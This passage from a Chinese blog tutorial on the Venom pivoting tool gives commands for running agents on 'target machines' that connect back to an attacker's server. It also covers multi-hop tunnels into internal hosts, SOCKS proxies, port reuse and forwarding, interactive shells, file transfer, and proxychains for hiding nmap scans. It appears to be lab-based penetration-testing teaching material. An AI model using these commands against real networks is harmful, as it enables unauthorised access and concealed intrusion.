<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,假设其是一个可以被访问到的公网ip,模拟真实情况):192.168.22.1</span><br><span class="line">内网目标机1(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>个人服务器上传admin_linux_x64并只需以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">#假设192.168.22.1是一个可以被访问到的公网ip</span><br><span class="line">个人服务器</span><br><span class="line">./admin_linux_x64 -rhost 192.168.22.1 -rport 6666</span><br><span class="line">那么目标机就应该</span><br><span class="line">./agent_linux_x64 -lport 6666</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>出网目标机上传agent_linux_x64并执行以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 12.34.56.789 -rport 6666</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>回到个人服务器,在Venom命令行输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#当完成第二部后个人服务器上的admin服务后提示连接成功</span><br><span class="line">#展示当前的节点</span><br><span class="line">show</span><br><span class="line">#进入出网目标机节点</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>配置socks代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在个人服务器的1080端口建立socks5代理,后续只要代理设置为12.34.56.789:1080即可访问内网目标机2</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="2-多级代理使用方法-2">2.多级代理使用方法</h4>
<p>环境准备:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,只能访问不能被访问,真实环境下可以被访问):192.168.2.1</span><br><span class="line">内网目标机1(centos7):192.168.2.150和192.168.22.132</span><br><span class="line">内网目标机2(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>个人服务器上传admin_linux_x64并只需以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 6666</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>出网目标机上传agent_linux_x64并执行以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#连接个人服务器的6666端口</span><br><span class="line">./agent_linux_x64 -rhost 12.34.56.789 -rport 6666</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>内网目标机1上传agent_linux_x64并执行以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#监听本地8080端口</span><br><span class="line">./agent_linux_x64 -lport 8080</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>回到个人服务器,在Venom命令行输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入出网目标机节点(在此节点可以访问的到不出网的内网目标机1)</span><br><span class="line">goto 1</span><br><span class="line">#连接内网目标机1的8080端口</span><br><span class="line">connect 192.168.2.150 8080</span><br><span class="line">#此时会显示连接成功</span><br><span class="line">#进入内网目标机1节点(在这个节点可以访问到内网目标机2了)</span><br><span class="line">goto 2</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>配置socks代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#输入以下指令,会在个人服务器的1080开启代理服务,后续只要代理设置为12.34.56.789:1080即可访问内网目标机2</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114539.png" alt="image-20240206230831092"></p>
</li>
</ol>
<h4 id="3-端口复用支持">3.端口复用支持</h4>
<p>应用场合:某些情况下端口开放被禁用,我们可以使用已知的开放端口连接</p>
<p>介绍:通过venom提供的端口复用功能，在windows上可以复用apache、mysql等服务的端口，暂时无法复用RDP、IIS等服务端口，在linux上可以复用多数服务端口。被复用的端口仍可正常对外提供其原有服务。</p>
<p>环境准备:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin节点(本地虚拟机kail,可以访问192.168.22.133也可以被访问):192.168.2.1</span><br><span class="line">agent节点(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
<p>agent节点执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意这里lhost的ip地址写本机地址，但不要写0.0.0.0</span><br><span class="line">agent.exe -lhost 192.168.22.133 -reuse-port 80</span><br></pre></td></tr></table></figure>
<p>admin节点执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#admin连接192.168.22.133开放的80端口,而不会影响运行在其上的web服务</span><br><span class="line">./admin_linux_x64 -rhost 192.168.22.133 -rport 80</span><br></pre></td></tr></table></figure>
<h4 id="4-端口转发">4.端口转发</h4>
<p>在建立与内网之间的连接后我们还可以通过Venom将<mark>内网的端口转发到个人服务器的端口</mark>上,实现访问外部的个人服务器的某一端口即可访问到内网的某一端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在个人服务器12.34.56.789的Venom命令行输入以下指令即可将内网192.168.22.133的80端口映射到#12.34.56.789:8070,后续只要访问12.34.56.789:8070即可访问到192.168.22.133：80</span><br><span class="line"></span><br><span class="line">rforward 192.168.22.133 80 8070</span><br></pre></td></tr></table></figure>
<p>也支持将<mark>个人服务器的端口映射到内网的端口</mark></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在Venom命令行进入节点192.168.22.133输入以下指令即可将本地的80端口，映射到192.168.22.133的8070端口,后续内网主机只要访问192.168.22.133:8070即可访问到访问到个人服务器12.34.56.789的80端口</span><br><span class="line"></span><br><span class="line">lforward  127.0.0.1 80 8090</span><br></pre></td></tr></table></figure>
<h4 id="5-交互shell支持">5.交互shell支持</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入某一节点输入</span><br><span class="line">shell</span><br><span class="line">即可得到一个交互式shell</span><br></pre></td></tr></table></figure>
<h4 id="6-文件上传下载支持">6.文件上传下载支持</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入某一节点输入类似指令</span><br><span class="line">goto 1</span><br><span class="line">upload  [file_path]  [upload_path]  #上传文件</span><br><span class="line">download [file_path]  [download_path]  #下载文件</span><br></pre></td></tr></table></figure>
<p>参考博客:<a href="https://www.cnblogs.com/xuanlvsec/p/14206776.html">https://www.cnblogs.com/xuanlvsec/p/14206776.html</a></p>
<h3 id="代理设置工具-Proxifier-proxychains简单介绍"><mark>代理设置工具</mark>:Proxifier/proxychains简单介绍</h3>
<h5 id="Proxifier">Proxifier</h5>
<p>windows平台一般使用Proxifier来对特定软件进行代理</p>
<p>打开软件后选择Profile的proxy servers进行代理服务器的添加</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114541.png" alt="image-20240114162712523"></p>
<p>选择Proxification Rules进行相关规则的配置</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114542.png" alt="image-20240114162749125"></p>
<p>规则里面</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114543.png" alt="image-20240114162852342"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Default为默认的代理规则,这里是direct直连,表示默认所有软件不使用代理</p>
</li>
<li class="lvl-2">
<p>然后针对特定软件的特定代理规则需要自己配置,向这里的nmap使用的是12.34.56.789这个代理</p>
</li>
</ul>
<h5 id="proxychains">proxychains</h5>
<p>linux平台一般使用proxychains来对特定软件进行代理。kail自带有proxychains,以kail里的proxychains为例介绍</p>
<p>打开Proxychains配置文件/etc/proxychains4.conf，编辑文件中的代理服务器列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
<p>在文件的最后，添加代理服务器的IP地址和端口号，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<p>在终端中使用Proxychains启动需要代理的应用程序，例如Nmap扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sS 192.168.1.0/24	</span><br></pre></td></tr></table></figure>
<p>此时Nmap将使用Proxychains配置文件中的代理服务器进行扫描，实现IP地址的隐藏和匿名。</p>
<h4 id="相关博客链接">相关博客链接</h4>
<p><a href="https://su18.org/post/frp/">https://su18.org/post/frp/</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
</search>
